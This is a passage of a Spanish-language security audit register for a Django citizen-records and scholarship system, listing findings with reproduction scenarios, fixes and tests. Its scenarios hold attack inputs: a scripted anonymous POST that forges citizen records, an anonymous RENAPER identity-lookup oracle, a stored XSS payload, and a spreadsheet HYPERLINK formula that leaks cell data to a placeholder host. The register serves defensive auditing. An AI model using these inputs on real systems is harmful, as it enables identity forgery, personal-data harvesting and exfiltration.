- **Ubicación:** `conversaciones/urls.py:13` (`iniciar/`); `conversaciones/views/public.py:108-139` (sin login ni rate limit); `conversaciones/forms/chat.py:17-22` (`datos_renaper = forms.JSONField` que manda el cliente); `conversaciones/services/chat.py:33-55` (`Ciudadano.objects.get_or_create(dni=…, defaults={nombre: datos_renaper["nombre"], …})`). Consumidores del legajo: `programas/services/becas.py:260-279` (`resolver_ciudadano_offline` no pisa nombre ni apellido), `programas/services/padron.py:466-480` (solo completa vacíos), `programas/services/siis_envio.py:437-452` (el alta usa `ciudadano.nombre/apellido`).
- **Escenario:** un script toma la cookie CSRF de `/conversaciones/chat/` y hace `POST /conversaciones/iniciar/` con `{"tipo":"personal","dni":"45123456","sexo":"F","datos_renaper":{"nombre":"X","apellido":"Y"}}` para una lista de DNI. Cuando esas personas se inscriben, su caso se vincula a ese legajo; la validación por padrón o Gran Base marca el caso como validado pero no corrige el legajo (SIIS-08) y el alta a SIIS sale con el nombre falso (irreversible). Además deja una `Conversacion` activa por request.
- **Propuesta:**
  - **Ola 0:** desmontar las rutas públicas de `conversaciones` (`chat/`, `consultar-renaper/`, `iniciar/`, `<id>/enviar/`, `<id>/mensajes/`) en `conversaciones/urls.py`; como mínimo, borrar el `get_or_create` de `iniciar_conversacion_publica` (una conversación no crea legajos).
  - **Ola 7 (fase 2, A5-42/A6-28):** quitar los includes `conversaciones/` y `api/conversaciones/` de `config/urls.py` y, de `conversaciones/routing.py` (montado en `config/asgi.py`), las rutas `ws/conversaciones/…` y `ws/alertas-conversaciones/`; **conservar `ws/alertas/`** (`AlertasConsumer`, alertas de legajos del backoffice, asegurado en G1c-04: si se apaga, decidirlo aparte con H-10), limpiando en el mismo cambio las referencias `{% url 'conversaciones:…' %}` de `templates/includes/base.html:376-379`, las entradas del sidebar (`templates/includes/sidebar/opciones.html:153` «Dashboard Conversaciones» y `:386` «Cola Conversaciones»), la card de `inicio.html` y la solapa `tab-conversaciones` de `ciudadano_detail.html:743`.
  - **Datos:** auditar en PRD con P-10 (README §3).
- **Tests a agregar:** `conversaciones/tests/test_public.py::test_iniciar_publico_desmontado` (POST anónimo con `datos_renaper` → 404 y `Ciudadano.objects.filter(dni=…).exists()` False).
- **Verificación:** V-STD + V-UI (fase 2).
- **Dependencias:** G1-02 en el mismo PR.

### G1-02 · Segundo oráculo RENAPER anónimo: `/conversaciones/consultar-renaper/` devuelve nombre, apellido, nacimiento y domicilio de cualquier DNI
**Severidad:** ALTA · **Estado:** CONFIRMADO (lectura) · **Origen:** G1-02 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** tomada (conversaciones sin uso)

**Resolución:** ✅ Resuelto en #510 (Cambio 101), 01-oct-2026 — `consultar-renaper/` desmontada; se borraron la vista `consultar_renaper`, el servicio `consultar_renaper_para_chat` y `RenaperConsultaForm`; test en `conversaciones/tests/test_public.py`.
- **Ubicación:** `conversaciones/urls.py:12`; `conversaciones/views/public.py:45-105` (sin login; `rate_limit_excedido(..., limite=10, ventana_segundos=60)` por IP real vía `ip_cliente`); `conversaciones/services/chat.py:27-30` → `legajos.services.consulta_renaper.consultar_datos_renaper`. La respuesta incluye `"domicilio"` y distingue «fallecido».
- **Escenario:** mismo patrón que SEC-04 por otra puerta; 10/min por IP se multiplica con cualquier pool de IPs. **Si se cierra solo SEC-04, este queda abierto.**
- **Propuesta:** desmontarlo junto con G1-01. Si algún día se reactiva el chat, la consulta debe devolver solo «coincide / no coincide» contra lo que la persona tipeó, nunca el domicilio.
- **Tests a agregar:** `POST /conversaciones/consultar-renaper/` anónimo → 404, con `mock` de `consultar_datos_renaper` y `assert_not_called`.
- **Verificación:** V-STD.

## MEDIA

### SEC-15 · Uploads de F-00 y de solicitud de merendero sin lista blanca de tipo ni techo de tamaño
**Severidad:** MEDIA (A3-08 era ALTA y A5-29 BAJA) · **Estado:** CONFIRMADO-AJUSTADO con test (`SEC15UploadsTests`) · **Origen:** A3-08, A5-29 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-15
- **Ubicación:** `programas/forms.py:818-819` (`F00DinamicoForm`, `forms.FileField` sin validadores); `SolicitudMerenderoForm`; modelos `programas/models/__init__.py:878`, `:977-980`. Requiere usuario interno con `dispositivo.admitir` o `merendero.crear`. El XSS se sirve same-origin en DEV (nginx) y también en ECOM (`django.views.static.serve` infiere `text/html` para `.html` y no manda `attachment`).
- **Escenario (reproducido):** `SolicitudMerenderoForm` con `documentacion=x.html` → válido.
- **Propuesta:** `core/validators.py::validar_adjunto(archivo, extensiones=ADJUNTO_EXTENSIONES, max_bytes=ADJUNTO_MAX_BYTES)`, reusando las constantes del Cambio 46 que hoy viven en la API de campo; lista blanca `.pdf .jpg .jpeg .png .heic .webp` (default D-15: sin `.doc/.docx`) y firma por magic bytes para pdf, png y jpg. Aplicarlo en `ArchivoAdmision.archivo`, `SolicitudMerendero.documentacion` y `HistorialContacto.archivo_adjunto` (`validators=[...]`, migración sin cambio de esquema) y en `F00DinamicoForm` para `TipoCampo.ARCHIVO`. La mitigación de fondo es SEC-09 (`attachment` + `nosniff`).
- **Tests a agregar:** `programas/tests/test_uploads_whitelist.py`: `test_merendero_rechaza_html`, `test_f00_rechaza_svg`, `test_archivo_mayor_al_tope_rechazado`.
- **Verificación:** V-STD.

### SEC-16 · `/api/users/users/` y `/api/users/groups/<id>/users/` listan el personal con DNI, teléfono e `is_superuser`
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC16UsersApiListTests`) · **Origen:** A5-16 (+ `GroupViewSet.users`, `users/api_views/__init__.py:159-169`) · **Ola:** 0 · **Esfuerzo:** incluido en SEC-05 · **Decisión:** D-05

**Resolución:** ✅ Resuelto en #540 (Cambio 113), 03-oct-2026, con SEC-05 — `/api/users/users/` y `/api/users/groups/<id>/users/` ya no existen (404); `me` solo devuelve al propio usuario. PoC `SEC16UsersApiListTests` invertida en `users/tests/test_api_rbac.py`.
- **Escenario (reproducido):** usuario plano, GET `?is_staff=true` → 200 con `is_superuser` (también `?groups=<id Administrador>`).
- **Propuesta:** la de SEC-05 (apagar la API salvo `me`). Si se conserva: list/retrieve con `CAPS_ENTRADA_ABM_USUARIOS` y `get_queryset = usuarios_visibles_para(self.request.user)`, y sacar `dni` y `observacion` de `ProfileSerializer` anidado en `UserSerializer`.
- **Tests a agregar:** `test_list_sin_capacidad_403` (o 404 si se apaga) y `test_me_200`.

### SEC-17 · La API REST de usuarios y roles saltea las reglas del ABM web
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC17RenombrarCiudadanosTests`) · **Origen:** A5-17 · **Ola:** 0 · **Esfuerzo:** incluido en SEC-05 (apagar) / M (conservar) · **Decisión:** D-05

**Resolución:** ✅ Resuelto en #540 (Cambio 113), 03-oct-2026, con SEC-05 (camino «apagar» de D-05) — no queda escritura de usuarios ni roles por API: el PATCH del rol protegido `Ciudadanos`, el alta y la asignación de roles inactivos dan 404. PoC `SEC17RenombrarCiudadanosTests` invertida.
- **Escenario (reproducido):** con `rol.administrar`, PATCH `/api/users/groups/<Ciudadanos>/ {"name": "Ciudadanos2"}` → 200 aunque `protegido=True`; `es_ciudadano_portal` resuelve por nombre (`rbac.py:628`), así que los ciudadanos dejan de detectarse y **entran al backoffice**. Además `groups = PrimaryKeyRelatedField(queryset=Group.objects.all())` asigna roles inactivos, y no se llama a `asegurar_admin_restante` ni a `validate_password`.
- **Propuesta:** apagar la escritura (SEC-05). Si se conserva: `update`/`partial_update` de `GroupViewSet` → 400 si `meta.protegido`; serializers de usuario validan `groups` contra `_roles_asignables_queryset(operador)` y corren `asegurar_admin_restante` en `transaction.atomic`.
- **Tests a agregar:** `test_patch_rol_protegido_400`, `test_patch_usuario_que_deja_sin_admin_400` (o 404 si se apaga).

### SEC-18 · Alertas: cerrar cualquiera por id; las CRÍTICAS de todo el sistema visibles para quien no tiene legajos
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC11…alertas_dashboard`; `test_repro_dispositivos_legajos.py::A313A314`) · **Origen:** A5-18, A3-13 (= LEG-07), G1c-05, G1c-06 · **Ola:** 2 → **R, dentro del PR R-19** · **Esfuerzo:** S · **Decisión:** D-18

**Ampliado por RED-89 — se implementa en R-19 (Ola R).** La ficha se ejecuta **completa** en ese PR; sus 2 h se mueven
de la Ola 2 (PR 3) a la Ola R. Lo que el barrido del 04-oct agregó, medido con un usuario sin ningún rol: las tres
entradas de cierre —`cerrar_alerta_ajax` y `cerrar_alerta_api`, que están entre las 17 del barrido, más
`AlertasViewSet.cerrar`, la 18.ª, que queda fuera porque con la base vacía no hay objeto que cerrar— devuelven 200 y dejan la alerta
ajena en `activa=False`, y `/legajos/alertas/`, `/legajos/alertas/preview/` y `/api/legajos/alertas/` traen el **nombre
del ciudadano y el texto de la alerta**. Además, `POST /api/legajos/alertas/<pk>/cerrar/` con un `pk` **no numérico** da
**500** (`AlertasService.cerrar_alerta` recibe el `pk` crudo): lo cierra el `self.get_object()` que esta ficha ya pide,
y conviene agregarle su test (`test_api_cerrar_con_pk_no_numerico_da_404`).

**⚠ Actualizar (03-oct-2026):** `AlertasViewSet` hoy en `legajos/api_views/__init__.py:65` y `cerrar` en `:95` (`AlertasService.cerrar_alerta(pk, request.user)`, todavía sin `get_object()`). #542 (Cambio 114) le sumó `BackofficeAutenticado`, pero sigue sin capacidad (`[BackofficeAutenticado, IsAuthenticated]`): decidirla en este PR (R0b-06).
- **Ubicación:** `legajos/services/filtros_usuario.py:31-33` (sin legajos propios, `filtros = Q(prioridad="CRITICA")`); `legajos/services/alertas.py:206-218` (`cerrar_alerta` con `AlertaCiudadano.objects.get(id=…)`); entradas `cerrar_alerta_api`, `cerrar_alerta_ajax` (`legajos/views/contactos_api.py:123-135`, `legajos/views/alertas.py:64-71`) y `AlertasViewSet.cerrar` (`legajos/api_views/__init__.py:84-93`, `detail=True` sin `get_object()`); `legajos/views/alertas.py:11,74,91` solo `login_required`.
- **Escenario (reproducido):** un usuario sin roles ni legajos ve «riesgo» en `/legajos/alertas/`; `POST /legajos/alertas/<n>/cerrar-ajax/` con n = 1..N silencia todas las alertas del sistema.
- **Propuesta:** en el fallback, `return AlertaCiudadano.objects.none()` (o `Q(pk__in=[])`); `cerrar_alerta(alerta_id, usuario)` → `FiltrosUsuarioService.obtener_alertas_usuario(usuario).get(id=alerta_id)` (si no existe, False); `AlertasViewSet.cerrar` usa `self.get_object()`; `@requiere("ciudadano.ver")` en `alertas_dashboard`, `alertas_count_ajax`, `alertas_preview_ajax` y `cerrar_alerta_ajax`. Default D-18: aceptar que el badge quede en 0 para quien hoy ve CRÍTICAS globales (las globales las ve `config.administrar`, ya previsto en `filtros_usuario.py:20-21`).
- **Tests a agregar:** `test_usuario_sin_legajos_no_ve_criticas`, `test_cerrar_alerta_fuera_de_alcance_no_la_cierra`, `test_api_cerrar_usa_get_object_404`.
- **Verificación:** V-STD + `manage.py test legajos`.
- **Dependencias:** G1c-04 (el WS difunde lo mismo sin alcance): mismo PR o seguido.

**Resolución:** ✅ Resuelto en #556 (Cambio 126, PR R-19), 04-oct-2026 — `@requiere("ciudadano.ver")` en
`alertas_dashboard`, `alertas_count_ajax`, `alertas_preview_ajax`, `cerrar_alerta_ajax` y `cerrar_alerta_api`;
`AlertasViewSet` cambia `IsAuthenticated` por `RequiereCapacidad("ciudadano.ver")` (**R0b-06**, que cierra con esta
ficha) y `cerrar` usa `self.get_object()`, que resuelve sobre el queryset ya acotado y de paso mata el **500** del `pk`
no numérico. El fallback de `FiltrosUsuarioService` pasa de `Q(prioridad="CRITICA")` a
`AlertaCiudadano.objects.none()`: sin legajos propios el alcance es vacío (**default D-18**, el badge queda en 0; las
globales las sigue viendo `config.administrar`). `AlertasService.cerrar_alerta` busca la alerta dentro de
`obtener_alertas_usuario(usuario)` y devuelve `False` fuera de ahí, también ante un id no entero. **La campana del
navbar sigue la misma capacidad** (ronda 2 de la revisión): el bloque entero —botón, contador, dropdown, los dos links
al dashboard y el punto de estado del WebSocket— va dentro de `{% if request.user|puede:"ciudadano.ver" %}`, y
`alertas_websocket.js` sale temprano si no encuentra `#alertas-counter`, así no abre `ws/alertas/` ni pide endpoints
que van a rebotar. Sin eso, a todo usuario de Becas o de Dispositivos le quedaba el dropdown en «Cargando alertas...»
para siempre (el rebote devuelve el HTML del inicio y `response.json()` rompía) y los dos links iban a `/inicio/`. **Dónde la ficha no
coincidía con el código / efecto lateral a mirar:** `cerrar_alerta` aceptaba `usuario=None`; ahora sin usuario no hay
alcance y devuelve `False` — no había llamadores así. Y `dashboard/tests/test_api_rbac.py` tenía un test que
**afirmaba el fallback**: un usuario con `ciudadano.sensible` sin legajos veía las CRÍTICAS de todos. Se reescribió en
dos (sin alcance → vacío; con legajo propio → solo las suyas), porque afirmaba justo lo que esta ficha vino a sacar.
**Test permanente:** `legajos.tests.test_alertas_rbac` (en particular
`AlertasAlcanceTests.test_un_usuario_sin_legajos_no_ve_las_criticas_del_sistema`,
`AlertasAlcanceTests.test_cerrar_una_alerta_fuera_de_alcance_no_la_cierra` y
`AlertasApiTests.test_con_pk_no_numerico_da_404_y_no_revienta`).

### SEC-19 · XSS almacenado en `/legajos/alertas/debug/` y rutas de prueba publicadas
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC18DebugXssTests`; `A313A314`) · **Origen:** A5-19, A3-14 (= LEG-08), A6-16 (= FE-15) · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #537 (Cambio 111), 03-oct-2026 — desmontadas `alertas/debug/`, `alertas/test/`, `test-contactos/` y `test-api/` (las cuatro → 404) y borradas `debug_alertas`, `test_alertas_page` y `test_api`. No hubo templates que borrar: `legajos/test_alertas.html` ya no existía (de ahí el 500) y `dashboard_simple.html` se conserva porque lo usa `dashboard-contactos/`. Test en `legajos/tests/test_rutas_debug.py`.
- **Ubicación:** `legajos/views/alertas.py:118-203` (sink en `:171`: `f"<li>… {alerta.ciudadano.nombre_completo}: {alerta.mensaje}</li>"` en `HttpResponse`; también entran sin escapar `request.user.username` y los nombres de grupo); rutas `legajos/urls/__init__.py:52-53`, `:99-100`.
- **Escenario (reproducido):** un ciudadano con nombre `<img src=x onerror=alert(1)>` y una alerta CRÍTICA hacen que `/legajos/alertas/debug/` lo devuelva literal a un usuario sin roles. En navegador (V5a): `/legajos/test-contactos/` 200 con `main` vacío, `/legajos/alertas/test/` 500, `/legajos/alertas/debug/` y `/legajos/test-api/` 200.
- **Propuesta:** borrar las rutas `alertas/debug/`, `alertas/test/`, `test-contactos/` y `test-api/` de `legajos/urls/__init__.py`, y las vistas `debug_alertas`, `test_alertas_page` (`legajos/views/alertas.py:118-203`) y `test_api` (`dashboard_simple.py`) con sus templates. El resto del código muerto de Legajos va en LEG-06.
- **Tests a agregar:** `legajos/tests/test_rutas_debug.py::test_rutas_de_debug_no_existen` (`reverse` → `NoReverseMatch` para los 4 nombres).
- **Verificación:** V-STD + V-UI (`compile_templates.py`).

### SEC-20 · Inyección de fórmulas en CSV/XLSX (exports legacy de convocatoria y padrón completo de ciudadanos)
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-20, G3-01 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-20 (capacidad de exportación)

**Resolución:** ✅ Resuelto en #626 (Cambio 177, Ola 2 PR 5), 08-oct-2026 — `celda_segura` en los **cinco** exports que se arman a mano (los tres CSV de la convocatoria, el padrón de ciudadanos y el CSV de reportes de legajos) y, de yapa, en los **encabezados** de CSV y XLSX: en «respuestas por persona» son los textos de las preguntas, que los carga un operador, y la ficha solo nombraba las celdas. **DECISIÓN CLIENTE: D-20 = Sí, sembrada a quienes tienen `ciudadano.ver` (decidido por el PM el 08-oct-2026: el Operador de backoffice conserva la exportación).** `ciudadano.exportar` entra al `CATALOGO` de `core/rbac.py` (nada de permisos sueltos), se siembra por migración de datos a **todo rol que tenga `ciudadano.ver`** (`users.0028`, con reversa), el botón del listado sigue a la capacidad y la descarga queda registrada en `core.requests` con usuario, filas y búsqueda. La migración **solo agrega** filas y, con este criterio, nadie pierde la exportación el día del deploy: lo que cambia es que la capacidad queda **separada** del ver, así que de acá en adelante se le puede quitar rol por rol desde el ABM de Roles, sin deploy. El log del deploy lista los roles que la recibieron. **Test permanente:** `legajos.tests.test_ciudadanos_export.ExportarCiudadanosCapacidadTests` y `.CiudadanosExportarCsvTests.test_una_formula_en_el_apellido_sale_neutralizada`; `programas.tests.test_reportes.ExportsDeConvocatoriaTests`; `users.tests.test_migracion_ciudadano_exportar.SembrarCiudadanoExportarTests` y `users.tests.test_seed_datos_base.SeedGestionCiudadanosTests`.
- **Ubicación:** `programas/views/relevamientos.py:430-452`, `:489-503`, `:512-535` (3 exports de convocatoria); `legajos/views/ciudadanos.py:47-68` (padrón completo de ciudadanos); `legajos/views/dashboard_simple.py:80-102`; encabezados XLSX en `programas/services/exportacion_reportes.py:61`, `:93`, `:109`. `celda_segura` ya existe y la usan los reportes nuevos.
- **Escenario:** un apellido `=HYPERLINK("https://x/?"&A2;"ver")` (cargado por el link público, la app o —G1-01— desde internet) se evalúa cuando el operador abre el CSV en Excel/LibreOffice. Aporte de G3: cualquier `ciudadano.ver` (incluido el «Operador de backoffice», que no da altas) descarga el padrón completo (~100k DNI) sin límite, sin registro y **sin forma de impedírselo** sin quitarle también el legajo.
- **Propuesta:** `writer.writerow([celda_segura(v) for v in fila])` en los 5 exports (en los de convocatoria, en el mismo diff de SEC-06) y en los encabezados XLSX; registrar la descarga de ciudadanos en `core.requests` con el conteo; D-20: ¿la exportación masiva necesita capacidad propia (`ciudadano.exportar`)? Resuelta: sí, sembrada a los roles que hoy tienen `ciudadano.ver` (el PM descartó el default de `ciudadano.editar`, que le sacaba la exportación al Operador de backoffice sin que nadie lo pidiera).
- **Tests a agregar:** apellido `=1+1` → la celda sale `'=1+1` en los 5 exports (`programas/tests/test_reportes.py` y `legajos/tests/test_exportar_csv.py`).
- **Verificación:** V-STD.

### SEC-21 · Cupo: el Coordinador Regional ve y muta casos de los subsegmentos de sus pares
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-21, A1-12 (= BEC-08) · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #626 (Cambio 177, Ola 2 PR 5), 08-oct-2026 — las tres tablas de `CupoSegmentoDetailView` filtran por `convocatorias_visibles` además del segmento, y las tres mutaciones (`baja`, `promover`, `agregar a espera`) pasan por `assert_alcance_formulario`, que es el mismo guard del listado. **Un desvío de la ficha, deliberado:** el alcance se materializa en una **lista de ids** y no como subconsulta `__in=convocatorias_visibles(...)`, porque las tres consultas de la pantalla la repetirían anidada —el patrón que ya costó un 500 por `read_timeout` en ECOM—; son decenas de filas. **Lo que no se acotó, también a propósito:** el conjunto «ya está en lista de espera» sigue mirando todo el segmento, porque un caso que puso otro coordinador no tiene que reaparecer como pendiente. **Test permanente:** `programas.tests.test_coordinador_regional.AlcanceDeCupoTests` (`test_regional_no_ve_casos_de_par_en_cupo`, `test_regional_no_da_baja_caso_de_par`, y las dos contracaras: el Regional sigue dando de baja **su** caso y el admin del programa sigue viendo el segmento entero).
- **Ubicación:** `programas/views/cupo.py:67-143` (querysets por segmento), `:146-156`, `:179-182`, `:213-216` (mutaciones con `puede_gestionar_segmento`, que para el Regional da True con todo segmento que contenga un subsegmento suyo, `programas/services/autorizacion.py:152-154`). **Contradice el Cambio 18** («ni por URL directa»).
- **Escenario:** la Regional de «Ladrillo» hace `GET /becas/cupo/segmento/<S>/` y ve nombre y DNI de beneficiarios, espera y pendientes del subsegmento «Carbón» de un par; con `becas.beneficiario.editar` hace `POST /becas/cupo/beneficiario/<pk>/baja/`.
- **Propuesta:** en los tres querysets de `CupoSegmentoDetailView`, sumar `relevamiento__convocatoria__in=convocatorias_visibles(self.request.user)` (para `ListaEspera`: `formulario__relevamiento__convocatoria__in=`); en las 3 FBV, reemplazar el chequeo por `assert_scope_formulario(user, formulario)`, moviendo `_assert_scope_formulario` de `programas/views/revision.py` a `programas/services/autorizacion.py`. Coordinar con PERF-02 (misma vista).
- **Tests a agregar:** en `programas/tests/test_coordinador_regional.py`: `test_regional_no_ve_casos_de_par_en_cupo` y `test_regional_no_da_baja_caso_de_par`.
- **Verificación:** V-STD.

### SEC-22 · Reportes, XLSX y cupo ignoran RN-P13 (casos del link público)
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura); depende de decisión · **Origen:** A5-22, A5-31 · **Ola:** 2 · **Esfuerzo:** S-M · **Decisión:** D-22

**Resolución:** ✅ Resuelto en #626 (Cambio 177, Ola 2 PR 5), 08-oct-2026 — **DECISIÓN CLIENTE D-22 = Sí.** El filtro de RN-P13 pasa a `services/autorizacion.py` (una sola copia) y se aplica en `reportes_becas._formularios` —de donde salen `beneficiarios_queryset` y los reportes—, en los tres querysets del cupo y en el CSV de lista de espera de la convocatoria, que la ficha no nombraba. **Dónde no se aplica, por la revisión de la ronda 2:** en los **agregados** de `reporte_cupos` (ocupado, disponible, lista de espera), que son capacidad y no personas, y que con el filtro puesto decían 3/97 donde la stat card de Cupo y la aprobación (`get_cupo_stats`, segmento entero) dicen 10/90. D-22 ocultó datos de personas, no cambió contadores de cupo. En el tablero se aplica **una vez** en `resolver_alcance`: con eso se van los casos públicos de los indicadores, las series, las distribuciones y los bloques exportables, y `respuestas_por_persona` recibe `incluir_publicos` **obligatorio** —sin default— porque un default abierto es la forma en que este bug vuelve. **Lo que la ficha no podía prever:** el dashboard se cachea por una huella del alcance que no incluía la capacidad, así que dos usuarios con los mismos segmentos y distinto RN-P13 compartían la entrada y el filtro no se notaba; la huella ahora la lleva, y se arma en una sola función para que los dos lugares que la calculan no se separen. **Dependencia OPS-06 en pie:** mientras el seed no tilde `becas.relevamiento.publico`, el filtro oculta lo público para todos los roles sembrados salvo el `Administrador` (que la recibió por `users.0025`). **Test permanente:** `programas.tests.test_relevamiento_publico.RnP13FueraDeLaPantallaTests` (cupo, reporte de beneficiarios, XLSX de respuestas y los dos tableros, incluido el que prueba que no comparten caché) y `.CupoYReporteCuentanLaCapacidadTests` (el reverso: el reporte y la pantalla cuentan los 10/90 y las listas siguen sin las personas del link público).
- **Ubicación:** `programas/services/dashboard_becas.py:1093`, `:1177-1178`; `programas/views/dashboard_becas.py:158-172`; `programas/services/reportes_becas.py:20-21`, `:372-396`; `programas/views/cupo.py:89-121`, `:146-236`.
- **Escenario:** un Referente con `becas.reportes.exportar` y sin `becas.relevamiento.publico` baja el XLSX de respuestas y obtiene DNI, celular, email, GPS y respuestas de los casos del link público que en pantalla no puede ver.
- **Propuesta (default D-22 = sí):** aplicar `_sin_formularios_publicos_si_no_puede` (excluir `relevamiento__tipo=PUBLICO` cuando `not puede(user, "becas.relevamiento.publico", programa=programa_becas(user))`) en `respuestas_por_persona`, `beneficiarios_queryset`, `_formularios` y en los querysets de cupo.
- **Tests a agregar:** Referente sin la capacidad → el XLSX y la pantalla de cupo no incluyen casos PUBLICO.
- **Verificación:** V-STD.
- **Dependencias:** OPS-06 (hoy el seed apaga `becas.relevamiento.publico` en cada arranque: sin OPS-06, nadie la tiene y el filtro oculta todo lo público).

### SEC-23 · App de campo: PATCH y adjuntos sobre casos ya resueltos; PATCH expone `validado_renaper` y `client_uuid`
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-23, G1-15 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** —
- **Ubicación:** `programas/api/views.py:441-466` (`FormularioViewSet` con `UpdateModelMixin`; `perform_update` no mira `formulario.estado`), `:467-495` (adjuntos), `:56-62`; `programas/api/serializers.py:68-114` (`validado_renaper`, `client_uuid` y `capturado_en` fuera de `read_only_fields`; `client_uuid` declarado explícito pisa el `editable=False`).
- **Escenario:** con el token, `PATCH /api/becas/formularios/<id>/ {"validado_renaper": false}` sobre un caso con `identidad_forzada=True` deshace la validación manual del revisor; un PATCH semanas después sobre un APROBADO cambia `datos_identificacion` o el apoderado y vuelve a disparar `resolver_ciudadano_offline`. Ni la build de ECOM ni `origin/main` de la app hacen PATCH.
- **Propuesta:** sacar `UpdateModelMixin` de `FormularioViewSet` (dejar retrieve + adjuntos) y pasar `validado_renaper` a `read_only_fields`; en `adjuntos` (POST), `if formulario.estado != Formulario.Estado.ENVIADO: return 409`. El sync offline legítimo solo crea casos (POST a `relevamientos/<id>/formularios/`).
- **Tests a agregar:** `programas/tests/test_becas_api.py::test_patch_formulario_405` y `::test_adjunto_sobre_aprobado_409`.
- **Verificación:** V-STD + `manage.py test programas.tests.test_becas_api`.

**Resolución:** ✅ Resuelta en #638 (Cambio 184), 08-10-2026 — `FormularioViewSet` quedó en
`RetrieveModelMixin` + la acción `adjuntos` (PATCH y PUT contestan **405**, el router deja de mapear
los verbos), `validado_renaper` pasó a `read_only_fields` y el POST de adjuntos contesta **409
`code=CASO_RESUELTO`** cuando el caso no está `ENVIADO` **y ese campo ya tiene un adjunto**.
`client_uuid` y `capturado_en` **siguen siendo escribibles**: son la idempotencia de la cola offline y
la fecha de captura del alta, y sin el PATCH ya no hay forma de cambiarlos después (el
`test_el_alta_repetida_sigue_siendo_idempotente_por_client_uuid` del contrato lo sostiene). Efecto
lateral: la excepción de D-RED-10 —el PATCH era el único de los seis endpoints que contestaba 400 en
vez de 409 ante una pausa— desapareció con el verbo, así que el contrato de la pausa quedó uniforme
sin pedir release de `Chaco-mobile`.
**El 409 mira el campo, no solo el estado (ronda 2 de la revisión).** La primera versión rechazaba
*toda* subida sobre un caso no-`ENVIADO`, y eso no costaba «la foto»: costaba el relevamiento. Ante el
409 la cola marca la operación `FAILED_PERMANENT` (`relevamientoService.js:1487`) y
`hasPendingFormularioOperations` (`:1030`) cuenta las fallidas, así que el `finalizar_relevamiento` del
teléfono quedaba bloqueado **para siempre** y con él se perdían **todos** los adjuntos pendientes del
caso. Lo que la ficha quiere frenar es el **reemplazo silencioso** de la foto del DNI de un caso ya
resuelto, y eso es exactamente lo que el guard mira ahora: si el campo ya tiene archivo, 409; si está
vacío, entra con **201** y una línea en `observaciones_carga` que nombra el campo y el estado del caso
(`campo.ADJUNTO_TARDIO`, el patrón de G1-07 / Cambio 178), que no se repite en un reintento y que
`revisar_carga` arrastra cuando `aplicar_revision` reescribe la columna.
**Test permanente:** `programas.tests.test_becas_api.FormularioSyncTests.test_patch_formulario_405`,
`programas.tests.test_becas_api.AdjuntoSobreCasoResueltoTests` (7 tests: `test_adjunto_sobre_aprobado_409`,
`test_el_campo_vacio_de_un_caso_resuelto_recibe_el_archivo_observado`,
`test_la_observacion_del_archivo_tardio_no_se_repite`,
`test_el_reemplazo_sobre_un_caso_enviado_sigue_sin_observarse`…) y
`programas.tests.test_becas_api_contrato.ContratoAppDeCampoTests.test_el_validado_renaper_del_telefono_se_ignora_sin_dar_400`.

### SEC-24 · La app de campo se autovalida la identidad con `origen: personas`
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-24 · **Ola:** 2 · **Esfuerzo:** M · **Decisión:** D-24
- **Ubicación:** `programas/api/views.py:115-122` (`elif origen in ("personas","gran_base"): validado = bool(nombre and apellido)`); el comentario de `:146` («el cliente nunca puede autovalidarse») no se cumple. El Cambio 57 registra «la app no puede autovalidarse (mismo principio que hoy con personas/scan)»: **hay que corregir el registro o el código**.
- **Escenario:** un token de campo manda una identidad inventada con `"origen":"personas"` y el caso queda `validado_renaper=True`.
- **Propuesta:** con origen `personas`, re-consultar en el servidor `identificar(formulario.relevamiento, dni, sexo)` (cacheado) y validar solo si coincide. Default D-24: `scan` cuenta como validación (registrarlo como decisión), `personas` no sin re-consulta.
- **Tests a agregar:** invertir `programas/tests/test_becas_api.py:453` (hoy fija el comportamiento actual); `test_origen_personas_no_coincide_no_valida`.
- **Verificación:** V-STD.
- **Dependencias:** G1-05 (validación del resto del formulario en el servidor).

**Resolución:** ✅ Resuelta en #638 (Cambio 184), 08-10-2026 — con `origen: personas`/`gran_base` el
servidor vuelve a resolver la identidad con `identificar(formulario.relevamiento, dni, sexo)`, la
misma cascada del Cambio 57, y **solo valida si la fuente respalda**. D-24 aplicada: `scan` sigue
contando (es el documento físico leído por la cámara y el servidor no lo puede re-verificar), queda
registrada como decisión en el código. Con la Gran Base caída —o con un DNI que no figura— el caso
entra igual pero **sin validar**, que es el camino de la validación manual del revisor (Cambio 55).
El comentario de la vista («el cliente nunca puede autovalidarse») pasó a ser cierto para las cuatro
ramas.
**El revisor se entera de por qué (ronda 2 de la revisión).** El `logger.warning` lo lee el operador
del servidor, no quien revisa el caso: sin nada en la pantalla, un caso sin validar por una caída de
la fuente se ve idéntico a uno sin validar porque el documento no figura, y la validación manual se
hace a ciegas. La rama `personas`/`gran_base` deja ahora una línea en `observaciones_carga` que
distingue los dos (`campo.IDENTIDAD_NO_ENCONTRADA` cuando `identificar` devuelve `no_encontrado` —la
fuente respondió y el documento no está— y `campo.IDENTIDAD_FUENTE_SIN_RESPUESTA` cuando no
respondió). La escribe el mismo `save` que ya guardaba `validado_renaper`, y si un reintento del alta
sí acredita, la línea se borra.
**Dos desvíos de la ficha, los dos a propósito:**
1. *No se compara, se pisa.* La ficha dice «validar solo si coincide». Comparar dejaría el flag en
   `False` pero la identidad inventada seguiría viaje al legajo que arma `resolver_ciudadano_offline`.
   Se hace lo mismo que ya hacía la rama `padron` (Cambio 57, RN-4): lo que queda guardado en
   `datos_identificacion` es lo que dijo la fuente, y si no respaldó nada el origen pasa a `manual`.
   Las dos ramas comparten ahora `_pisar_identidad_acreditada`.
